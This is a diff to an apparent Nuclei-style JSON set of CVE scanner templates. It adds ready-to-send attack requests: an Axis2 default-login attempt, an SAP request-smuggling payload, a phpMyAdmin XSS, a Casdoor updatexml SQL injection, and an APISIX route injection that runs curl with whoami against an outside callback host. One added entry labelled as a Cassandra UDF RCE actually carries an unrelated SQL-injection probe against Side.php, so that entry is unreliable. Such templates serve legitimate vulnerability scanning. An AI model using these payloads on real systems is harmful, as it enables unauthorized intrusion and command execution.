@@ -564,6 +564,21 @@
       ]
     },
     {
+      "id": "CVE-2010-0219",
+      "info": {
+        "name": "Apache Axis2 Default Login",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /axis2-admin/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nloginUsername={{username}}&loginPassword={{password}}\n",
+            "POST /axis2/axis2-admin/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nuserName={{username}}&password={{password}}&submit=+Login+\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-0467",
       "info": {
         "name": "Joomla! Component CCNewsLetter - Local File Inclusion",
@@ -14470,8 +14485,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
@@ -15542,6 +15557,25 @@
       ]
     },
     {
+      "id": "CVE-2021-44521",
+      "info": {
+        "name": "Apache Cassandra Load UDF RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "body": "sidefunc=update&syear=111'",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8"
+          },
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/Side.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-44528",
       "info": {
         "name": "Open Redirect in Host Authorization Middleware",
@@ -15764,6 +15798,20 @@
       ]
     },
     {
+      "id": "CVE-2022-22536",
+      "info": {
+        "name": "SAP Memory Pipes(MPI) Desynchronization",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET {{sap_path}} HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 82646\nConnection: keep-alive\n\n{{repeat(\"A\", 82642)}}\n\nGET / HTTP/1.1\nHost: {{Hostname}}\n\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-22947",
       "info": {
         "name": "Spring Cloud Gateway Code Injection",
@@ -15842,7 +15890,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/setup/index.php?page=servers&mode=test&id=\">'><script>alert(document.domain)</script>"
+            "{{BaseURL}}/setup/index.php?page=servers&mode=test&id=\">'><script>alert(document.domain)</script>",
+            "{{BaseURL}}/phpmyadmin/setup/index.php?page=servers&mode=test&id=\">'><script>alert(document.domain)</script>"
           ]
         }
       ]
@@ -15873,6 +15922,21 @@
           "raw": [
             "POST /apisix/batch-requests HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n{\n  \"headers\":{\n    \"X-Real-IP\":\"127.0.0.1\",\n    \"Content-Type\":\"application/json\"\n  },\n  \"timeout\":1500,\n  \"pipeline\":[\n    {\n      \"method\":\"PUT\",\n      \"path\":\"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1\",\n      \"body\":\"{\\r\\n \\\"name\\\": \\\"test\\\", \\\"method\\\": [\\\"GET\\\"],\\r\\n \\\"uri\\\": \\\"/api/{{randstr}}\\\",\\r\\n \\\"upstream\\\":{\\\"type\\\":\\\"roundrobin\\\",\\\"nodes\\\":{\\\"httpbin.org:80\\\":1}}\\r\\n,\\r\\n\\\"filter_func\\\": \\\"function(vars) os.execute('curl https://{{interactsh-url}}/`whoami`'); return true end\\\"}\"\n    }\n  ]\n}\n",
             "GET /api/{{randstr}} HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-24124",
+      "info": {
+        "name": "Casdoor 1.13.0 - SQL Injection (Unauthenticated)",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),1)"
           ]
         }
       ]
